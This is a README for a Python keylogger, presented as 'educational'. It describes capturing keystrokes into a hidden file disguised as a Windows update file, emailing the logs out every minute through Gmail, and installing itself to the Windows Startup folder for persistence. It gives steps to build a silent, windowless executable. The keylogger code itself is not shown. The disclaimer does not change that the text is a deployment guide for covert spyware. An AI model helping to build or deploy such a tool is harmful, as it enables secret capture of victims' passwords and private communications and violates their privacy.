# Simple Keylogger for Learning (Educational Use Only)

> **⚠️ DISCLAIMER:** This tool is for educational and self-testing purposes **only**.  
> I am **not responsible** for any illegal use, misuse, or violations of privacy laws. Use responsibly, and always respect privacy and local laws.

---

## 📋 How It Works

This is a simple Python-based keylogger that:
- Logs keystrokes to a hidden file (`WindowsUpdate.dat` in `%APPDATA%`)
- Periodically sends logs to your email via Gmail SMTP
- Automatically installs itself to the Windows Startup folder for persistence
- Runs silently in the background

---

## 🚀 Usage Guide

### **1. Set Up Your Own Email Configuration**


**Steps to configure your own email:**

1. **Use a Gmail account** with [App Passwords](https://support.google.com/accounts/answer/185833?hl=en) enabled
   - Go to your Google Account settings
   - Enable 2-Factor Authentication
   - Generate an App Password (NOT your regular Gmail password)

2. **Open `main_template.py`** and replace the configuration:
EMAIL_ADDRESS = "your_email@gmail.com" # Your Gmail address
EMAIL_PASSWORD = "your_app_password_here" # Your Gmail App Password 
EMAIL_SEND_INTERVAL = 60 


3. **Save as `main.py`** (this file should NOT be pushed to GitHub—see `.gitignore`)

### **2. Install Dependencies**

In your project directory, run:
pip install -r requirements.txt


### **3. Run the Program**

**Option A: Run directly with Python**
python main.py

**Option B: Build as Executable (Recommended)**
Install PyInstaller if you haven't already
pip install pyinstaller

Build the executable
pyinstaller --onefile --noconsole main.py

- The EXE will be created in the `dist/` folder
- Use `--noconsole` flag to run without a visible window
- Run the EXE once to automatically add it to Windows Startup

### **4. Testing**

- The program will start logging keystrokes immediately
- Logs are saved to `%APPDATA%\WindowsUpdate.dat`
- Emails are sent at the interval you specified
- Check your email for keystroke reports


